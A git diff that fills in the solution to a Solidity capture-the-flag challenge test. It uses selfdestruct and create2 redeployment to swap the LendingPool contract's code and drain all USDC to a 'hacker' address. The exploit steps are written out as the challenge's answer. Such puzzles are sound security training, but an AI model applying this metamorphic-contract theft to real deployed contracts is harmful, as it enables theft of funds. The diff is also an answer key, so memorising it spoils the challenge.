@@ -10,12 +10,10 @@ import {LendingHack} from "../src/3_LendingPool/LendingHack.sol";
 import {USDC} from "../src/3_LendingPool/USDC.sol";
 import {LendExGovernor} from "../src/3_LendingPool/LendExGovernor.sol";
 
-/*////////////////////////////////////////////////////////////
-//          DEFINE ANY NECESSARY CONTRACTS HERE             //
-//    If you need a contract for your hack, define it below //
-////////////////////////////////////////////////////////////*/
-
-
+/*//////////////////////////////////////////////////////////////////////
+// terminal command to run the speciffic test:                        //
+// forge test --match-contract Challenge3Test -vvvv                   //
+//////////////////////////////////////////////////////////////////////*/
 
 /*////////////////////////////////////////////////////////////
 //                     TEST CONTRACT                        //
@@ -62,37 +60,20 @@ contract Challenge3Test is Test {
             "lendingPool contract has the original name"
         );
         vm.startPrank(hacker);
-        /*//////////////////////////////////////////////////////////////////////
-        //                      Add your hack below!                          //
-        //                          Hack part #1                              //
-        // NOTE!!! Foundry has a bug                                          //
-        // anything selfdestruct() related has to be in the setUp() function  //
-        //                                                                    //
-        // terminal command to run the speciffic test:                        //
-        // forge test --match-contract Challenge3Test -vvvv                   //
-        //////////////////////////////////////////////////////////////////////*/
 
+        lendingPool.emergencyStop();
+        createDeployer.cleanUp();
 
-
-    
-        //====================================================================//
         vm.stopPrank();
     }
 
     function testExploit() public {
         vm.startPrank(hacker);
-        /*//////////////////////////////////////////////////////////////
-        //                    Add your hack below!                    //
-        //                        Hack part #2                        //
-        // Please implement necessary changes also to LendingHack.sol //
-        // terminal command to run the specific test:                 //
-        // forge test --match-contract Challenge3Test -vvvv           //
-        //////////////////////////////////////////////////////////////*/
 
+        createDeployer = CreateDeployer(create2Deployer.deploy());
+        lendingHack = LendingHack(createDeployer.deploy(false, address(usdc)));
+        lendingHack.withdraw();
 
-
-
-        //=============================================================//
         vm.stopPrank();
 
         assertEq(
@@ -100,6 +81,10 @@ contract Challenge3Test is Test {
             "LendingPool hack",
             "lendingPool contract address now gives a different name"
         );
-        assertEq(usdc.balanceOf(hacker), usdcAmount, "Hacker has to steal all the stablecoin tokens");
+        assertEq(
+            usdc.balanceOf(hacker),
+            usdcAmount,
+            "Hacker has to steal all the stablecoin tokens"
+        );
     }
 }
